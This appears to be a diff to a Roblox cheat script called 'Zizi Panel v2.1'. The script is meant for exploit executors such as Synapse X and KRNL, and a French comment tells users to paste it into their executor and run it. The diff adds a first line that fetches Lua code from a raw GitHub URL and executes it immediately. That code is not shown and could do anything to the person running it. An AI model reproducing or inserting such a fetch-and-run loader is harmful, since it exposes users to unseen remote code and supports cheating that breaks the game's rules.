@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tkt59/zizi/refs/heads/main/kiki"))()
 -- Zizi Panel v2.1 | Compatible: Synapse X, KRNL, Fluxus, Solara
 -- Colle ce script dans ton executeur et lance-le
 
